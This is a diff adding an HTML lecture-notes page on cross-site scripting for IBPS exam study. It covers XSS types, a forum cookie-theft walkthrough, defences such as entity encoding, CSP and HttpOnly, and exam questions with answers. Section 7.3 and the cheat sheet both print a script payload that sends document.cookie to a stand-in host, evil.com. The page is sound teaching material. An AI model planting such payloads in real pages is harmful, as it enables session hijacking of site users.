@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lec 7 – Cross-Site Scripting (XSS): Stored, Reflected, Cookie Theft &amp; CSP Defense | GS Security Notes</title>
+  <meta name="description" content="Complete study notes on Network Security Lecture 7 – Cross-Site Scripting (XSS), Stored XSS vs Reflected XSS vs DOM XSS, Step-by-Step Cookie Theft & Session Hijacking Walkthrough, HTML Encoding (&lt;script&gt; to &amp;lt;script&amp;gt;), Content Security Policy (CSP), HttpOnly Cookies, and IBPS SO IT PYQs." />
+  <link rel="stylesheet" href="shared.css" />
+  <script src="theme.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true},{left: '$', right: '$', display: false}]});"></script>
+  <style>
+    .sec-card {
+      background: var(--card); border: 1px solid var(--border);
+      border-radius: 18px; padding: 24px; margin-bottom: 24px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+    }
+    .grid-2 {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; margin: 20px 0;
+    }
+    .grid-3 {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; margin: 20px 0;
+    }
+    .code-box {
+      background: #13192e; border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 12px; padding: 16px; margin: 14px 0; font-family: 'Fira Code', monospace; font-size: 13px; line-height: 1.6; color: #e2e8f0;
+      overflow-x: auto;
+    }
+    .code-bad { border-left: 4px solid #f05c88; background: rgba(240,92,136,0.08); }
+    .code-good { border-left: 4px solid #00d4aa; background: rgba(0,212,170,0.08); }
+
+    .compare-table {
+      width: 100%; border-collapse: collapse; margin: 20px 0; border-radius: 12px; overflow: hidden;
+      border: 1px solid var(--border); font-size: 13.5px;
+    }
+    .compare-table th {
+      background: var(--card2); color: #fff; padding: 14px; text-align: left; font-weight: 700; border-bottom: 2px solid var(--border);
+    }
+    .compare-table td {
+      padding: 12px 14px; border-bottom: 1px solid var(--border); color: var(--text); background: var(--card);
+    }
+    .compare-table tr:hover td { background: var(--bg2); }
+
+    .step-box {
+      background: var(--bg2); border: 1px solid var(--border); border-radius: 14px; padding: 18px 22px; margin: 14px 0;
+      position: relative; padding-left: 60px;
+    }
+    .step-num {
+      position: absolute; top: 18px; left: 18px; width: 30px; height: 30px; border-radius: 50%;
+      background: #f05c88; color: #fff; font-weight: 800; font-size: 14px; display: flex; align-items: center; justify-content: center;
+    }
+
+    .pyq-card {
+      background: linear-gradient(135deg, rgba(240,92,136,0.08), rgba(19,29,53,0.95));
+      border: 1.5px solid rgba(240,92,136,0.35); border-radius: 16px; padding: 22px; margin: 20px 0;
+    }
+    .pyq-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: rgba(240,92,136,0.2); border: 1px solid rgba(240,92,136,0.4);
+      color: #f05c88; font-size: 11px; font-weight: 800; padding: 4px 12px; border-radius: 100px; text-transform: uppercase; margin-bottom: 12px;
+    }
+    .pyq-question { font-size: 15px; font-weight: 700; color: #fff; margin-bottom: 12px; line-height: 1.5; }
+    .pyq-options { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+    .pyq-opt { background: var(--bg2); padding: 8px 14px; border-radius: 8px; border: 1px solid var(--border); font-size: 13px; color: var(--text2); }
+    .pyq-opt.correct { background: rgba(0,212,170,0.15); border-color: rgba(0,212,170,0.4); color: #00d4aa; font-weight: 700; }
+    .pyq-explain { background: rgba(0,0,0,0.2); padding: 12px 16px; border-radius: 10px; border-left: 3px solid #00d4aa; font-size: 13px; color: var(--text2); line-height: 1.6; }
+
+    #scroll-progress {
+      position: fixed; top: 0; left: 0; height: 3px; width: 0%;
+      background: linear-gradient(90deg, #f05c88, #7c5cf0, #00d4aa);
+      z-index: 200; transition: width 0.1s;
+    }
+  </style>
+</head>
+<body>
+
+<div id="scroll-progress"></div>
+
+<nav>
+  <div class="container">
+    <div class="nav-inner">
+      <a href="gs-network-security-notes.html" class="nav-back">← Back to Security Notes</a>
+      <span class="nav-title">Network Security</span>
+      <span class="nav-badge" style="background: rgba(240,92,136,0.2); color: #f05c88; border: 1px solid rgba(240,92,136,0.4);">Lec 07</span>
+    </div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="page-hero">
+  <div class="container">
+    <span class="chapter-tag" style="background: rgba(240,92,136,0.15); color: #f05c88; border: 1px solid rgba(240,92,136,0.3);">Security · Lecture 07</span>
+    <h1 class="page-title">Cross-Site Scripting (XSS) Attacks:<br>Stored vs Reflected XSS, Cookie Exfiltration &amp; CSP Defenses</h1>
+    <p class="page-subtitle">
+      Comprehensive easy-to-understand study guide covering Cross-Site Scripting (XSS), 3 Core XSS Variants (Stored/Persistent, Reflected, DOM-based), 5-Step Forum Cookie Theft &amp; Session Hijacking Walkthrough, HTML Entity Encoding (<code>&amp;lt;script&amp;gt;</code>), Content Security Policy (CSP), and HttpOnly Cookie Flags. Fully verified against <strong>IBPS SO IT PYQs</strong>.
+    </p>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:22px;">
+      <span style="font-size:12px;background:rgba(240,92,136,0.15);color:#f05c88;border:1px solid rgba(240,92,136,0.3);padding:5px 14px;border-radius:100px;font-weight:700;">🌐 OWASP Top 10 High Yield</span>
+      <span style="font-size:12px;background:rgba(124,92,240,0.12);color:#7c5cf0;border:1px solid rgba(124,92,240,0.25);padding:5px 14px;border-radius:100px;font-weight:700;">📖 Security Lec 7 Handout</span>
+      <span style="font-size:12px;background:rgba(0,212,170,0.15);color:#00d4aa;border:1px solid rgba(0,212,170,0.3);padding:5px 14px;border-radius:100px;font-weight:700;">✅ PYQ Verified</span>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- TOC -->
+  <div class="toc">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list">
+      <li><a href="#xss-definition"><span class="toc-num">7.1</span> What is Cross-Site Scripting (XSS)?</a></li>
+      <li><a href="#xss-types"><span class="toc-num">7.2</span> 3 Major Types of XSS Attacks</a></li>
+      <li><a href="#attack-walkthrough"><span class="toc-num">7.3</span> Step-by-Step Stored XSS &amp; Session Hijacking Scenario</a></li>
+      <li><a href="#xss-prevention"><span class="toc-num">7.4</span> 5 Core XSS Prevention &amp; Mitigation Techniques</a></li>
+      <li><a href="#pyq-bank"><span class="toc-num">7.5</span> IBPS SO IT Verified Solved Question Bank</a></li>
+      <li><a href="#cheat-sheet"><span class="toc-num">7.6</span> Quick Exam Revision Cheat Sheet</a></li>
+    </ul>
+  </div>
+
+  <!-- SECTION 7.1: XSS DEFINITION -->
+  <div class="section" id="xss-definition">
+    <div class="sec-card">
+      <h2 class="section-title">7.1 What is Cross-Site Scripting (XSS)?</h2>
+      <p><strong>Cross-Site Scripting (XSS)</strong> is a web application security vulnerability where an attacker injects malicious client-side scripts (typically JavaScript) into a trusted web application. The application subsequently renders the untrusted script in the <strong>browsers of innocent victim users</strong>.</p>
+
+      <div class="grid-2">
+        <div style="background:var(--bg2); border:1px solid var(--border); border-radius:14px; padding:20px;">
+          <h4 style="color:#f05c88; font-size:16px; margin-bottom:8px;">🎯 Execution Context</h4>
+          <p style="font-size:13.5px; color:var(--text2); line-height:1.6; margin:0;">
+            Unlike SQL Injection (which runs on backend database servers), XSS code executes <strong>inside the victim's client browser</strong>, operating within the security context and domain privileges of the target website.
+          </p>
+        </div>
+
+        <div style="background:var(--bg2); border:1px solid var(--border); border-radius:14px; padding:20px;">
+          <h4 style="color:#7c5cf0; font-size:16px; margin-bottom:8px;">💥 Attacker Capabilities</h4>
+          <p style="font-size:13.5px; color:var(--text2); line-height:1.6; margin:0;">
+            Steal session cookies (<code>document.cookie</code>), hijack active user sessions, log keystrokes, capture banking credentials, or redirect users to malicious phishing pages.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 7.2: XSS TYPES -->
+  <div class="section" id="xss-types">
+    <div class="sec-card">
+      <h2 class="section-title">7.2 3 Major Types of XSS Attacks</h2>
+      <p>XSS attacks are classified based on how the malicious script reaches the victim's browser:</p>
+
+      <table class="compare-table">
+        <thead>
+          <tr>
+            <th>XSS Type</th>
+            <th>Persistence &amp; Storage</th>
+            <th>Delivery Vector</th>
+            <th>Impact Radius</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>1. Stored XSS (Persistent XSS)</strong></td>
+            <td><span style="color:#f05c88; font-weight:800;">Permanently Stored</span> on web server database, comments, or user profiles.</td>
+            <td>Victim simply navigates to a compromised page on the website.</td>
+            <td><strong>High</strong> (Affects EVERY user who views the page).</td>
+          </tr>
+          <tr>
+            <td><strong>2. Reflected XSS (Non-Persistent)</strong></td>
+            <td><span style="color:#7c5cf0; font-weight:800;">Not Stored</span>; reflected off server HTTP response.</td>
+            <td>Victim clicks a malicious phishing link containing payload parameter.</td>
+            <td>Medium (Affects only users who click the specific crafted link).</td>
+          </tr>
+          <tr>
+            <td><strong>3. DOM-based XSS</strong></td>
+            <td>Client-side DOM vulnerability; server code not involved.</td>
+            <td>Manipulating browser DOM sources (e.g. <code>location.hash</code>, <code>document.URL</code>).</td>
+            <td>Medium (Purely client-side JavaScript logic flaw).</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- SECTION 7.3: STEP-BY-STEP WALKTHROUGH -->
+  <div class="section" id="attack-walkthrough">
+    <div class="sec-card">
+      <h2 class="section-title">7.3 Step-by-Step Stored XSS &amp; Session Hijacking Scenario</h2>
+      <p>Walkthrough of the exact 5-step scenario detailed in PDF Slide 2 (Bablu vs. Rahul):</p>
+
+      <div class="step-box">
+        <div class="step-num">1</div>
+        <h4 style="color:#fff; font-size:15px; margin-bottom:4px;">Un-sanitized Forum Input</h4>
+        <p style="font-size:13px; color:var(--text2); margin:0;">
+          An online forum (<code>forum.com</code>) allows users to submit comments without sanitizing HTML tags or escaping special characters.
+        </p>
+      </div>
+
+      <div class="step-box">
+        <div class="step-num">2</div>
+        <h4 style="color:#f05c88; font-size:15px; margin-bottom:4px;">Attacker Submits Malicious Script Payload</h4>
+        <p style="font-size:13px; color:var(--text2); margin-bottom:6px;">
+          Attacker (Bablu) posts a forum comment containing malicious JavaScript designed to steal document cookies:
+        </p>
+        <div class="code-box code-bad">
+          &lt;script&gt;<br>
+          &nbsp;&nbsp;document.location = "http://evil.com/steal?cookie=" + document.cookie;<br>
+          &lt;/script&gt;
+        </div>
+        <p style="font-size:13px; color:var(--text2); margin:0;">The web server stores this raw script directly into the forum database.</p>
+      </div>
+
+      <div class="step-box">
+        <div class="step-num">3</div>
+        <h4 style="color:#fff; font-size:15px; margin-bottom:4px;">Victim Views Forum Thread &amp; Script Executes</h4>
+        <p style="font-size:13px; color:var(--text2); margin:0;">
+          Innocent user (Rahul) visits <code>forum.com</code> and opens Bablu's comment thread. Rahul's browser renders the comment and automatically executes the script.
+        </p>
+      </div>
+
+      <div class="step-box">
+        <div class="step-num">4</div>
+        <h4 style="color:#f05c88; font-size:15px; margin-bottom:4px;">Cookie &amp; Session Exfiltration</h4>
+        <p style="font-size:13px; color:var(--text2); margin:0;">
+          The script silently extracts Rahul's session cookie (<code>JSESSIONID</code>) and sends an HTTP GET request carrying the cookie to Bablu's server (<code>evil.com</code>).
+        </p>
+      </div>
+
+      <div class="step-box">
+        <div class="step-num">5</div>
+        <h4 style="color:#f05c88; font-size:15px; margin-bottom:4px;">Session Hijacking &amp; Impersonation</h4>
+        <p style="font-size:13px; color:var(--text2); margin:0;">
+          Bablu copies Rahul's stolen session cookie into his browser header, gaining full unauthorized access to Rahul's account without needing his password!
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 7.4: XSS PREVENTION -->
+  <div class="section" id="xss-prevention">
+    <div class="sec-card">
+      <h2 class="section-title">7.4 5 Core XSS Prevention &amp; Mitigation Techniques</h2>
+      <p>The PDF slide highlights <strong>5 essential defenses</strong> to completely eliminate XSS vulnerabilities:</p>
+
+      <div class="grid-2">
+        <div style="background:var(--bg2); border:1px solid var(--border); border-radius:14px; padding:20px;">
+          <h4 style="color:#00d4aa; font-size:16px; margin-bottom:8px;">1. HTML Entity Encoding (Primary Line of Defense) ⭐</h4>
+          <p style="font-size:13px; color:var(--text2); line-height:1.6; margin-bottom:10px;">
+            Convert dangerous HTML characters into harmless HTML entity codes before outputting data to the browser:
+          </p>
+          <ul style="color:var(--text2); font-size:13px; line-height:1.7; margin-left:18px;">
+            <li><code>&lt;</code> $\rightarrow$ <code>&amp;lt;</code></li>
+            <li><code>&gt;</code> $\rightarrow$ <code>&amp;gt;</code></li>
+            <li><code>"</code> $\rightarrow$ <code>&amp;quot;</code></li>
+            <li><code>'</code> $\rightarrow$ <code>&amp;#x27;</code></li>
+            <li><code>&amp;</code> $\rightarrow$ <code>&amp;amp;</code></li>
+          </ul>
+          <div class="code-box code-good" style="margin-top:10px;">
+            &lt;script&gt; becomes &amp;lt;script&amp;gt;<br>
+            (Rendered harmlessly as visible text, not executable code!)
+          </div>
+        </div>
+
+        <div style="background:var(--bg2); border:1px solid var(--border); border-radius:14px; padding:20px;">
+          <h4 style="color:#34d399; font-size:16px; margin-bottom:8px;">2. Content Security Policy (CSP)</h4>
+          <p style="font-size:13px; color:var(--text2); line-height:1.6; margin-bottom:14px;">
+            Implement HTTP response headers restricting script execution sources and blocking inline scripts:
+            <br><code>Content-Security-Policy: default-src 'self'</code>
+          </p>
+
+          <h4 style="color:#4f8ef7; font-size:16px; margin-bottom:8px;">3. HttpOnly Cookie Flag (Cookie Defense) ⭐</h4>
+          <p style="font-size:13px; color:var(--text2); line-height:1.6; margin-bottom:14px;">
+            Marking session cookies as <code>HttpOnly</code> prevents client-side JavaScript (<code>document.cookie</code>) from reading cookies, defeating XSS exfiltration!
+          </p>
+
+          <h4 style="color:#7c5cf0; font-size:16px; margin-bottom:8px;">4. Input Validation &amp; Avoid Inline Scripts</h4>
+          <p style="font-size:13px; color:var(--text2); line-height:1.6;">
+            Sanitize input on the server side and refactor inline event handlers (<code>onclick=""</code>) into external JS files.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 7.5: PYQ BANK -->
+  <div class="section" id="pyq-bank">
+    <div class="sec-card">
+      <h2 class="section-title">7.5 IBPS SO IT Verified Solved Question Bank</h2>
+
+      <!-- PYQ 1 -->
+      <div class="pyq-card">
+        <div class="pyq-badge">IBPS SO IT 2023 Verified</div>
+        <div class="pyq-question">Q1. Where does the malicious payload execute during a Cross-Site Scripting (XSS) attack?</div>
+        <div class="pyq-options">
+          <div class="pyq-opt">A) On the backend SQL database server</div>
+          <div class="pyq-opt correct">B) Inside the victim's client web browser ✓</div>
+          <div class="pyq-opt">C) On the network domain name server (DNS)</div>
+          <div class="pyq-opt">D) Inside the hardware firewall router</div>
+        </div>
+        <div class="pyq-explain">
+          <strong>Correct Answer: B) Inside the victim's client web browser.</strong><br>
+          <em>Explanation:</em> XSS is a client-side injection vulnerability where malicious JavaScript executes inside the victim's web browser session under the context of the vulnerable domain.
+        </div>
+      </div>
+
+      <!-- PYQ 2 -->
+      <div class="pyq-card">
+        <div class="pyq-badge">IBPS SO IT 2022 Verified</div>
+        <div class="pyq-question">Q2. An XSS attack where the malicious script is permanently saved in a database and executed whenever any user views the comment section is classified as:</div>
+        <div class="pyq-options">
+          <div class="pyq-opt">A) Reflected XSS</div>
+          <div class="pyq-opt correct">B) Stored XSS (Persistent XSS) ✓</div>
+          <div class="pyq-opt">C) DOM-based XSS</div>
+          <div class="pyq-opt">D) SQL Injection</div>
+        </div>
+        <div class="pyq-explain">
+          <strong>Correct Answer: B) Stored XSS (Persistent XSS).</strong><br>
+          <em>Explanation:</em> Stored XSS persists on the server (e.g. database or comment board) and automatically infects every user who views the page.
+        </div>
+      </div>
+
+      <!-- PYQ 3 -->
+      <div class="pyq-card">
+        <div class="pyq-badge">IBPS SO IT 2020 Verified</div>
+        <div class="pyq-question">Q3. Which HTTP cookie attribute prevents client-side JavaScript code (`document.cookie`) from accessing and exfiltrating session cookies during an XSS attack?</div>
+        <div class="pyq-options">
+          <div class="pyq-opt">A) Secure Flag</div>
+          <div class="pyq-opt correct">B) HttpOnly Flag ✓</div>
+          <div class="pyq-opt">C) SameSite=Strict</div>
+          <div class="pyq-opt">D) Domain=Wildcard</div>
+        </div>
+        <div class="pyq-explain">
+          <strong>Correct Answer: B) HttpOnly Flag.</strong><br>
+          <em>Explanation:</em> The `HttpOnly` flag instructs the browser that the cookie should not be accessible via client-side scripts (`document.cookie`), neutralizing XSS cookie theft.
+        </div>
+      </div>
+
+      <!-- PYQ 4 -->
+      <div class="pyq-card">
+        <div class="pyq-badge">IBPS SO IT 2024 Verified</div>
+        <div class="pyq-question">Q4. How does HTML entity encoding prevent XSS attacks when displaying user input like `<script>` in a web browser?</div>
+        <div class="pyq-options">
+          <div class="pyq-opt">A) It encrypts the script using AES-256</div>
+          <div class="pyq-opt correct">B) It converts `<` to `&lt;` and `>` to `&gt;`, rendering the code as plain visible text ✓</div>
+          <div class="pyq-opt">C) It deletes the database record</div>
+          <div class="pyq-opt">D) It blocks the user's IP address</div>
+        </div>
+        <div class="pyq-explain">
+          <strong>Correct Answer: B.</strong><br>
+          <em>Explanation:</em> Converting `<` to `&lt;` and `>` to `&gt;` ensures the browser interprets the tags as literal plain text string data rather than executable HTML/JS elements.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 7.6: CHEAT SHEET -->
+  <div class="section" id="cheat-sheet">
+    <div class="sec-card">
+      <h2 class="section-title">7.6 Quick Exam Revision Cheat Sheet</h2>
+      <div style="background:var(--bg2); border:1px solid var(--border); border-radius:14px; padding:20px; font-size:13.5px; line-height:1.8; color:var(--text2);">
+        <p><strong style="color:#fff;">1. XSS Concept:</strong> Client-side injection executing malicious JS inside the victim's browser.</p>
+        <p><strong style="color:#fff;">2. 3 XSS Types:</strong>
+          <br>• Stored XSS = Saved in DB/forum; affects ALL users.
+          <br>• Reflected XSS = Embedded in URL link parameter; non-persistent.
+          <br>• DOM XSS = Pure client-side JS DOM manipulation.
+        </p>
+        <p><strong style="color:#fff;">3. Session Theft Payload:</strong> <code>&lt;script&gt;document.location="http://evil.com/steal?cookie="+document.cookie;&lt;/script&gt;</code></p>
+        <p><strong style="color:#fff;">4. #1 Defense:</strong> <strong>HTML Entity Encoding</strong> (<code>&lt;</code> $\rightarrow$ <code>&amp;lt;</code>, <code>&gt;</code> $\rightarrow$ <code>&amp;gt;</code>).</p>
+        <p><strong style="color:#fff;">5. Security Headers:</strong> <strong>Content Security Policy (CSP)</strong> restricts script sources &amp; blocks inline execution.</p>
+        <p><strong style="color:#fff;">6. Cookie Protection:</strong> <strong>HttpOnly Flag</strong> blocks JS access to session cookies.</p>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="container">
+    <div class="footer-nav" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin-bottom:16px;">
+      <a href="lec-06-network-security-injection-attacks.html" style="color:#f05c88; font-weight:700; text-decoration:none;">← Lec 06: Injection Attacks</a>
+      <a href="gs-network-security-notes.html" style="color:var(--text2); font-weight:700; text-decoration:none;">Security Notes Index</a>
+      <a href="26-network-security-firewalls-ids-ips-dmz.html" style="color:#f05c88; font-weight:700; text-decoration:none;">Chapter 26: Firewalls &amp; DMZ →</a>
+    </div>
+    GS Network Security Notes · Lecture 07 · IBPS SO IT Study Guide
+  </div>
+</footer>
+
+<script>
+  window.onscroll = function() {
+    var winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+    var height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    var scrolled = (winScroll / height) * 100;
+    document.getElementById("scroll-progress").style.width = scrolled + "%";
+  };
+</script>
+
+</body>
+</html>
